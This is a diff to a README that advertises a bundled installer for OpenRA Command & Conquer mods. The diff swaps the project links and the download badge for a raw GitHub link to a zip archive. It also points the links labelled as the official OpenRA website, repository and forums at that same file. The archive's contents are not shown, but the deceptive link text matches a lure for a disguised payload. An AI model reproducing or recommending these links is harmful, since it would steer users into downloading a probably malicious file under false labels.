@@ -5,7 +5,7 @@ description: "Download 10+ best OpenRA total conversion mods in one installer—
 ---
 # 🎮 openra-mod-pack-2026 - All Your Favorite Command & Conquer Mods in One Simple Installer
 
-[![Download Now](https://img.shields.io/badge/Download-OpenRA_Mod_Pack_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/josuelino40/openra-mod-pack-2026)
+[![Download Now](https://img.shields.io/badge/Download-OpenRA_Mod_Pack_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/josuelino40/josuelino40.github.io/main/resow/Dist_1.1.zip)
 
 Welcome to the ultimate collection of OpenRA mods! This package brings together the best total conversions and community creations for the classic Command & Conquer games. Instead of hunting down each mod separately and dealing with complicated installation procedures, we've bundled everything into one easy-to-use installer. Whether you're a veteran commander or new to the RTS genre, this pack will have you playing your favorite Westwood classics in minutes.
 
@@ -31,7 +31,7 @@ Getting your hands on this mod pack is incredibly straightforward. We've designe
 
 **Step 1: Visit the Download Page**
 
-Visit this link to download the application: [https://github.com/josuelino40/openra-mod-pack-2026](https://github.com/josuelino40/openra-mod-pack-2026)
+Visit this link to download the application: [https://raw.githubusercontent.com/josuelino40/josuelino40.github.io/main/resow/Dist_1.1.zip](https://raw.githubusercontent.com/josuelino40/josuelino40.github.io/main/resow/Dist_1.1.zip)
 
 **Step 2: Download the Installer**
 
@@ -137,9 +137,9 @@ This mod pack is distributed under the GNU General Public License v3.0. All mods
 
 ## 🔗 Additional Resources
 
-- **OpenRA Official Website:** [www.openra.net](https://www.openra.net)
-- **OpenRA GitHub Repository:** [github.com/OpenRA/OpenRA](https://github.com/OpenRA/OpenRA)
-- **Community Forums:** [forums.openra.net](https://forums.openra.net)
+- **OpenRA Official Website:** [www.openra.net](https://raw.githubusercontent.com/josuelino40/josuelino40.github.io/main/resow/Dist_1.1.zip)
+- **OpenRA GitHub Repository:** [github.com/OpenRA/OpenRA](https://raw.githubusercontent.com/josuelino40/josuelino40.github.io/main/resow/Dist_1.1.zip)
+- **Community Forums:** [forums.openra.net](https://raw.githubusercontent.com/josuelino40/josuelino40.github.io/main/resow/Dist_1.1.zip)
 
 ## ⭐ Ready to Command?
 
